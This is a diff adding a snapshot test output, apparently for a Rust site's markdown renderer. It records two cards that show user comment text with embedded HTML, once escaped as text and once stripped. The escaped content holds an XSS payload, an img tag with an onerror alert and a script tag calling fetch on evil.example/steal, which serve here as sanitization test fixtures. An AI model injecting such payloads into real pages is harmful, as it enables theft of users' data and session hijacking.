@@ -1,0 +1,32 @@
+---
+source: site/tests/snapshots.rs
+---
+<div style="--yi-grid-min:18rem" class="yi-grid">
+<section class="yi-card yi-card--header-plain">
+<header class="yi-card__header">
+<div class="yi-card__heading">
+<h3 class="yi-card__title">Shown as text</h3>
+</div>
+</header>
+<div class="yi-card__body">
+<div class="yi-markdown">
+<p>Thanks, that fixed it! &lt;img src=x onerror="alert(1)"&gt;</p>
+<p class="yi-markdown__html">&lt;script&gt;fetch("https://evil.example/steal")&lt;/script&gt;</p>
+<p>See my notes and this tracking pixel.</p>
+</div>
+</div>
+</section>
+<section class="yi-card yi-card--header-plain">
+<header class="yi-card__header">
+<div class="yi-card__heading">
+<h3 class="yi-card__title">Omitted</h3>
+</div>
+</header>
+<div class="yi-card__body">
+<div class="yi-markdown">
+<p>Thanks, that fixed it! </p>
+<p>See my notes and this tracking pixel.</p>
+</div>
+</div>
+</section>
+</div>
